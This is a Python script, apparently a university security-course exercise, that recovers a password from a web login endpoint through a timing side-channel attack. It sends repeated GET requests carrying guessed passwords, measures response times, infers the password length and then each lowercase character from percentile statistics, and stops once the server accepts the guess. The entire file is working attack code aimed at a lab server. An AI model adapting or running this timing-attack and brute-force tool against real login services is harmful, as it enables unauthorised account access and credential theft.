import statistics
import string
import sys
import time
from operator import itemgetter

import requests
from requests.exceptions import ConnectionError
import numpy as np

# Some constant definitions
URL = "http://aoi.ise.bgu.ac.il"
ATTEMPTS_PER_LETTER = 5
ATTEMPTS_PER_PASSWORD_LEN = 5  # For guessing the password length
MAX_PASSWORD_LEN = 32
REQUIRED_CONFIDENCE = 0.2


class PasswordFound(Exception):
    """
    This class stores the password raised in an exception when it gets revealed
    """

    def __init__(self, password):
        self.password = password


def eprint(*args, **kwargs):
    """
    Print to stderr
    """
    print(*args, file=sys.stderr, **kwargs)


def try_to_hack(username, password, difficulty):
    """
    This function sends ATTEMPTS_PER_LETTER times requests to the server
    :param username: the username
    :param password: the current guessed password
    :param difficulty: the difficulty level
    :return: list of all the RTTs took for each request
    """
    timings = np.array([])

    # Do #ATTEMPTS_PER_LETTER HTTP calls
    for _ in range(ATTEMPTS_PER_LETTER):
        try:
            before = time.perf_counter()
            result = requests.get(URL, params={'user': username, 'password': password, 'difficulty': difficulty})
            after = time.perf_counter()

            # Raise the password immediately in case we discover it
            if result.content == b'1':
                raise PasswordFound(password)

            timings = np.append(timings, after - before)

        except ConnectionError:
            # Ignore timeouts if occurs.. :\
            pass

    return timings


def calc_statistics(timings):
    """
    Calculate statistics of series of requests timings
    :param timings: timings (RTTs) of series of requests
    :return: the median, min_timing, max_timing, average, stddev, percentile_10
    """
    median = statistics.median(timings)
    min_timing = min(timings)
    max_timing = max(timings)
    average = sum(timings) / len(timings)
    stddev = statistics.stdev(timings)
    percentile_10 = np.percentile(timings, 10)

    return median, min_timing, max_timing, average, stddev, percentile_10


def choose_best(measures, top_k=3):
    # Get the max by the percentile_10
    sorted_measures = list(sorted(measures, key=itemgetter('percentile_10'), reverse=True))

    best_item = sorted_measures[0]
    top_k_items = sorted_measures[1:top_k + 1]

    msg = "Best item -> Item: %s percentile_10: %s Median: %s Max: %s Min: %s Stddev: %s"
    eprint(msg % (
        best_item['item'], best_item['percentile_10'], best_item['median'], best_item['max'], best_item['min'],
        best_item['stddev']))

    eprint("\nFollowing characters were:")

    for top_item in top_k_items:
        ratio = int((1 - (top_item['percentile_10'] / best_item['percentile_10'])) * 100)
        msg = "Item: %s percentile_10: %s Median: %s Max: %s Min: %s Stddev: %s (%d%% slower)"
        eprint(msg % (top_item['item'], top_item['percentile_10'], top_item['median'], top_item['max'], top_item['min'],
                      top_item['stddev'], ratio))

    return best_item, top_k_items


def compute_confidence(measures):
    """
    calculate the difference between best-second, and the second-last and return it
    :return:
    """
    sorted_measures = list(sorted(measures, key=itemgetter('percentile_10'), reverse=True))

    best_item = sorted_measures[0]['percentile_10']
    second_place_item = sorted_measures[1]['percentile_10']
    last_place_item = sorted_measures[-1]['percentile_10']

    range_best_and_second_place = best_item - second_place_item
    range_non_winners = second_place_item - last_place_item

    percent_of_range = range_best_and_second_place / range_non_winners
    final_confidence = percent_of_range / REQUIRED_CONFIDENCE

    eprint(f"best_item({best_item}) - second_place_item({second_place_item}) = {range_best_and_second_place}")
    eprint(f"second_place_item({second_place_item}) - last_place_item({last_place_item})= {range_non_winners}")
    eprint(
        f"{percent_of_range} = range_best_and_second_place({range_best_and_second_place}) / range_non_winners({range_non_winners})")
    eprint(f"final_confidence({final_confidence}) = {percent_of_range} / {REQUIRED_CONFIDENCE}")

    return final_confidence


def find_next_character(username, base_known_password, password_length, difficulty):
    """
    Find the next character in the password from a base_known_password
    :param username: the username
    :param base_known_password: the current guessed password
    :param password_length: the password length
    :param difficulty: the difficulty level
    :return: the next character in the password
    """
    final_confidence = 0

    eprint("Trying to find the character at position %s with prefix %r" % (
        (len(base_known_password) + 1), base_known_password))

    # should be at least >=1
    while final_confidence < 1:
        # If stddev>1 there is a peak in the traffic, so start again
        is_stddev_gt_one = True
        while is_stddev_gt_one:
            measures = []  # statistics for each guess
            for _, character in enumerate(string.ascii_lowercase):
                next_guess_password = base_known_password + character + "0" * (
                        password_length - len(base_known_password) - 1)

                timings = try_to_hack(username, next_guess_password, difficulty)

                # Calculate the statistics
                median, min_timing, max_timing, average, stddev, percentile_10 = calc_statistics(timings)

                is_stddev_gt_one = stddev > 1
                if is_stddev_gt_one:
                    eprint(f"stddev={stddev} >1 for: {next_guess_password}, restart checking for this position...")
                    break  # and restart the loop (check again every letter in this position)

                measures.append({'item': character, 'percentile_10': percentile_10, 'median': median, 'min': min_timing,
                                 'max': max_timing, 'average': average, 'stddev': stddev})

                eprint(
                    f'searching: {base_known_password + character + "0" * (password_length - len(base_known_password) - 1)}',
                    {'character': character, 'attempts': len(timings), 'percentile_10': percentile_10, 'median': median,
                     'min': min_timing,
                     'max': max_timing, 'average': average, 'stddev': stddev})

        # if 'confidence_lvl < 1' restart the loop (check again every letter in this position)
        final_confidence = compute_confidence(measures)
        if final_confidence < 1:
            eprint(f"final_confidence={final_confidence} <1, restart checking for this position...")
        else:
            eprint(f"final_confidence={final_confidence} >=1, choosing best")

    found_character, top_characters = choose_best(measures)

    eprint("Found character at position %s: %r" % ((len(base_known_password) + 1), found_character['item']))

    return found_character['item']


def assume_password_length(username, difficulty):
    """
    Assume the password length by calculating the avg. time it took for the response by the password length sent.
    :return:
    """
    # times_by_len = {i: [] for i in range(1, MAX_PASSWORD_LEN + 1)}  # Initialize with 0
    measures = []
    for pass_length in range(1, MAX_PASSWORD_LEN + 1):
        timings = np.array([])

        for i in range(ATTEMPTS_PER_PASSWORD_LEN):
            characters = '0' * pass_length

            before = time.perf_counter()
            _ = requests.get(URL, params={'user': username, 'password': characters, 'difficulty': difficulty})
            after = time.perf_counter()

            timings = np.append(timings, after - before)

        median, min_timing, max_timing, average, stddev, percentile_10 = calc_statistics(timings)
        measures.append({'item': pass_length, 'median': median, 'min': min_timing,
                         'max': max_timing, 'average': average, 'stddev': stddev, 'percentile_10': percentile_10})
        eprint({'length': pass_length, 'attempts': len(timings), 'median': median, 'percentile_10': percentile_10,
                'min': min_timing, 'max': max_timing, 'average': average, 'stddev': stddev})

    found_length, top_lengths = choose_best(measures)

    eprint("Found password length %s" % (found_length['item']))

    return found_length['item']


def main():
    # Do a first request to start the keep-alive connection
    _ = requests.get(URL)

    if len(sys.argv) != 3:
        print("Usage: python3 ex01_M1.py [username] [difficulty]")
        sys.exit(1)

    start = time.time()
    username = sys.argv[1]
    difficulty = sys.argv[2]

    print("current username: " + str(username) + ", current difficulty: " + str(difficulty))

    # While not found
    while 1:
        eprint()
        eprint('********************************************')
        eprint('NEW RUN:')
        eprint('********************************************')
        eprint()

        password = ''

        password_length = assume_password_length(username, difficulty)
        eprint(f'The password assumed length: {password_length}\n')

        try:
            while len(password) != password_length:
                next_character = find_next_character(username, password, password_length, difficulty)
                password += next_character

        except PasswordFound as p:
            print(p.password)
            eprint(p.password)
            break

    end = time.time()
    eprint(f'Took: {end - start} seconds')


if __name__ == '__main__':
    main()
